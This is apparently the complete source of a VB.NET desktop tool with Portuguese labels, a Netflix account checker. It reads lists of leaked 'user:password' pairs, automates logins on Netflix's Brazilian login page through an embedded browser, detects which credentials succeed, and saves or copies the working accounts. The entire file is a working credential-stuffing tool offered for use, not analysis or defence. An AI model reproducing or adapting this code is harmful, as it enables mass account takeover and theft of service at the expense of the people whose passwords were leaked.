Imports System.IO
Public Class Form1
    Public Structure Conta
        Public Usuario As String
        Public Senha As String
    End Structure
    Public Contas(25000) As Conta
    Public Verificando As Boolean = False
    Public Quntos As Integer = 0
    Public CurrentIndex As Integer = 0
    Sub DumparLista(ByVal Lista As ListBox)
        Dim local As String = Application.StartupPath + "\Dump.txt"
        Dim Linhas(Lista.Items.Count) As String
        Dim Index As Integer = 0
        For Each dd As String In Lista.Items
            Dim tCnt As Conta = ProcurarConta(dd)
            Linhas(Index) = tCnt.Usuario + ":" + tCnt.Senha
            Index = Index + 1
        Next
        File.WriteAllLines(local, Linhas)
    End Sub
    Function ProcurarConta(ByVal Usuario As String) As Conta
        Dim Max As Integer = Contas.Length
        For Each Cnt As Conta In Contas
            If (Cnt.Usuario = Usuario) Then
                Return Cnt
            End If
        Next
        MsgBox("Não foi possivel encontrar esta conta", "ERROR")
        Dim Conta2 As New Conta
        Return Conta2
    End Function
    Sub CarregarContas(ByVal Local As String)
        Dim Linhas As String()
        Linhas = File.ReadAllLines(Local)
        Dim Quantidade As Integer = 0
        For Each Linha As String In Linhas
            If (Verificar(Linha) = True) Then
                Contas(Quantidade) = New Conta()
                Contas(Quantidade) = RetornaConta(Linha)
                ListBox1.Items.Add(RetornaConta(Linha).Usuario)
                Quntos = Quantidade
                Quantidade = Quantidade + 1
            End If

        Next
    End Sub
    Public Function Verificar(ByVal str As String) As Boolean
        Dim Resultado As Boolean = False
        Dim index As Integer = str.IndexOf(":")
        If (index >= 0) Then
            If (str(index + 1) = "") Then
            Else

                Resultado = True
            End If
        End If
        Return Resultado
    End Function
    Public Function RetornaConta(ByVal str As String) As Conta
        Dim cnt As New Conta
        Dim index As Integer = str.IndexOf(":")
        Dim user As String = str.Substring(0, index)
        Dim senha As String = str.Substring(index + 1, str.Length - index - 1)
        cnt.Senha = senha
        cnt.Usuario = user
        Return cnt
    End Function
    Public Sub Logar(ByVal Usuario As String, ByVal Senha As String)
        WebBrowser1.Document.GetElementById("password").SetAttribute("value", Senha)
        WebBrowser1.Document.GetElementById("email").SetAttribute("value", Usuario)
        WebBrowser1.Document.GetElementById("login-form-contBtn").InvokeMember("click")
    End Sub
    Sub AdicionarNaLista(ByVal Index As Integer)
        ListBox2.Items.Add(Contas(Index).Usuario)

    End Sub
    Private Sub WebBrowser1_DocumentCompleted(ByVal sender As Object, ByVal e As WebBrowserDocumentCompletedEventArgs) Handles WebBrowser1.DocumentCompleted
        If (GroupBox1.Enabled = False) Then
            If (WebBrowser1.DocumentText.Contains("Entrar")) Then
                Label1.ForeColor = Color.Green
                Label1.Text = "Status: Conexão OK!"
                GroupBox1.Enabled = True
            End If
        End If
        If (Verificando = True) Then
            If (WebBrowser1.DocumentText.Contains("As informações de login inseridas não correspondem a uma conta em nossos registros") = True) Then
                'Senha incorreta :)
                CurrentIndex = CurrentIndex + 1
            Else
                AdicionarNaLista(CurrentIndex)
                WebBrowser1.Navigate("http://www.netflix.com/SignOut?lnkctr=mL")
                CurrentIndex = CurrentIndex + 1
            End If
            Verificando = False
        End If

    End Sub
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Label1.Text = "Status: Verificando conta: " + Contas(CurrentIndex).Usuario
        If (CurrentIndex <= Quntos) Then
            If (Verificando = False) Then
                If (WebBrowser1.DocumentText.Contains("Lembrar de mim neste computador") = True) Then
                    ListBox1.SelectedIndex = CurrentIndex
                    Logar(Contas(CurrentIndex).Usuario, Contas(CurrentIndex).Senha)
                    Verificando = True
                End If
         
            End If
        Else
            Button2.Enabled = True
            Timer1.Stop()
            Label1.Text = "Status: Concluido"
        End If
      
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim opf As New OpenFileDialog
        opf.Filter = "Arquivos de Texto (*.txt)|*.txt"
        If (opf.ShowDialog = Windows.Forms.DialogResult.OK) Then
            CarregarContas(opf.FileName)
        End If
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Timer1.Start()
        Button2.Enabled = False
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Timer2.Start()
    End Sub
    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Dim z As String = "Please upgrade your browser to continue using"
        If (WebBrowser1.DocumentText.Contains(z) = True) Then
            WebBrowser1.Navigate("http://www.netflix.com/SignOut?lnkctr=mL")
        End If
        If (WebBrowser1.DocumentText.Contains("Este sitio utiliza tecnología de") = True) Then
            WebBrowser1.Navigate("http://www.netflix.com/SignOut?lnkctr=mL")
        End If
        If (WebBrowser1.DocumentText.Contains("profilesGateWrapper") = True) Then
            WebBrowser1.Navigate("http://www.netflix.com/SignOut?lnkctr=mL")
        End If
        If (WebBrowser1.DocumentText.Contains("Finalize sua inscrição") = True) Then
            WebBrowser1.Navigate("http://www.netflix.com/SignOut?lnkctr=mL")
        End If
        If (WebBrowser1.DocumentText.Contains("Sessão encerrada") = True) Then
            WebBrowser1.Navigate("https://www.netflix.com/Login?locale=pt-BR")
        End If
    End Sub
    Private Sub UsuarioToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UsuarioToolStripMenuItem.Click
        If (ListBox2.SelectedIndex > -1) Then
            Dim Conta2 As Conta = ProcurarConta(ListBox2.SelectedItem)
            Clipboard.SetText(Conta2.Usuario)
            MsgBox("Copiado")
        End If

    End Sub
    Private Sub SalvarListaToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SalvarListaToolStripMenuItem.Click
        DumparLista(ListBox2)
    End Sub
    Private Sub SenhaToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SenhaToolStripMenuItem.Click
        If (ListBox2.SelectedIndex > -1) Then
            Dim Conta2 As Conta = ProcurarConta(ListBox2.SelectedItem)
            Clipboard.SetText(Conta2.Senha)
            MsgBox("Copiado")
        End If
    End Sub
    Private Sub UsuarioSenhaToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UsuarioSenhaToolStripMenuItem.Click
        If (ListBox2.SelectedIndex > -1) Then
            Dim Conta2 As Conta = ProcurarConta(ListBox2.SelectedItem)
            Clipboard.SetText(Conta2.Usuario + ":" + Conta2.Senha)
            MsgBox("Copiado")
        End If
    End Sub

    Private Sub AdicionarAListaToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AdicionarAListaToolStripMenuItem.Click
        Dim Lista As ListBox = ListBox2
        Dim local As String = Application.StartupPath + "\Lista.txt"
        Dim Linhas(50000) As String
        Dim Index As Integer = 0
        For Each dd As String In Lista.Items
            Dim tCnt As Conta = ProcurarConta(dd)
            Linhas(Index) = tCnt.Usuario + ":" + tCnt.Senha
            Index = Index + 1
        Next
        Index = Index
        Try
            Dim LinhasAntiga() As String = File.ReadAllLines(local)
            If (Linhas.Count > 0) Then
                Dim t As New ListBox
                t.Items.AddRange(LinhasAntiga)
                For Each Ss As String In t.Items
                    Linhas(Index) = Ss
                    Index = Index + 1
                Next
            End If
        Catch ex As Exception

        End Try
        Dim retorno(Linhas.Count) As String
        Dim gf As Integer = 0
        For Each i As String In Linhas
            retorno(gf) = i
            gf = gf + 1
        Next
        
        File.WriteAllLines(local, retorno)
    End Sub
End Class
